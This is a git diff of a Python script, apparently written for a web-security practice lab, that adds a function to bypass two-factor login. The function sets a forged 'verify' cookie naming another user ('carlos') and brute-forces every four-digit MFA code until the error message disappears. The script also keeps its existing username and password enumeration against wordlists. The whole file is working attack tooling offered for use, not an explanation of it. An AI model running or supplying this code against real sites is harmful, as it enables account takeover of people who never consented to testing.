@@ -4,6 +4,7 @@ import time
 
 from io import BytesIO
 from lxml import etree
+from urllib.parse import urlparse
 
 TARGET = ''
 TIMEOUT = 10
@@ -11,9 +12,16 @@ USERS_LIST = 'authentication/wordlists/usernames_acc_lock.txt'
 PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
 USER_INPUT_NAME = 'username'
 PASSWORD_INPUT_NAME = 'password'
-SEARCH_TERM = 'Invalid username or password.'
+SEARCH_TERM = 'Incorrect security code'
 DELAY = 90
 DELAYED_REQUEST = 3
+USERNAME = 'wiener'
+PASSWORD = 'peter'
+COOKIE_NAME = 'verify'
+COOKIE_VALUE = 'carlos'
+CODE_INPUT_NAME = 'mfa-code'
+DIGITS = 4
+
 
 def enumerate_usernames(target, users_list, user_input_name, password_input_name, search_term, timeout=10):
     session = requests.Session()
@@ -130,29 +138,56 @@ def enumerate_password(target, usernames, pwd_list, user_input_name, password_in
         print(f'username: {potential_credential['user']} password: {potential_credential['pwd']}')
     
     return potential_credentials
-    
-def get_params(content):
-    params = dict()
+
+def enumerate_mfa_code( target: str, code_input_name: str, cookie_name: str, cookie_value: str, error_msg: str, digits: int = 4, timeout: int = 10) -> int | None:
+    session = requests.Session()
+    session.cookies.set(cookie_name, cookie_value, domain=urlparse(target).netloc, path='/')
+
+    try:
+        mfa_page = session.get(target, timeout=timeout)
+    except requests.RequestException as e:
+        print(f'Request for MFA page failed: {e}')
+        sys.exit()
+
+    mfa_field = get_params(mfa_page.content)
+
+    for c in range(10 ** digits):
+        code = str(c).zfill(digits)
+        mfa_field[code_input_name] = code
+
+        try:
+            response = session.post(mfa_page.url, mfa_field, timeout=timeout)
+        except requests.RequestException as e:
+            print(f'Request failed with verification {code}: {e}')
+            continue
+
+        if search_tree(response.content, error_msg):
+            print(f'Verification code {code} failed.')
+        else:
+            print(f'Authenticated successfully using verification code {code}.')
+            return code
+        
+def get_params(content: bytes) -> dict[str, str | None]:
+    params: dict[str, str | None] = {}
     parser = etree.HTMLParser()
     tree = etree.parse(BytesIO(content), parser=parser)
 
     for input_elem in tree.findall('.//input'):
         name = input_elem.get('name')
-
         if name is not None:
             params[name] = input_elem.get('value', None)
-    
+
     return params
 
-def search_tree(content, term):
+
+def search_tree(content: bytes, term: str) -> bool:
     parser = etree.HTMLParser()
     tree = etree.parse(BytesIO(content), parser=parser)
-
     return bool(tree.xpath(f".//*[contains(normalize-space(string(.)), '{term}')]"))
 
 if __name__ == '__main__':
     #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT)
-    enumerate_password(
+    '''enumerate_password(
         TARGET,
         enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT),
         PASSWORD_LIST,
@@ -161,5 +196,14 @@ if __name__ == '__main__':
         SEARCH_TERM,
         DELAY,
         DELAYED_REQUEST,
+        TIMEOUT
+    )'''
+    enumerate_mfa_code(
+        TARGET,
+        CODE_INPUT_NAME,
+        COOKIE_NAME,
+        COOKIE_VALUE,
+        SEARCH_TERM,
+        DIGITS,
         TIMEOUT
     )
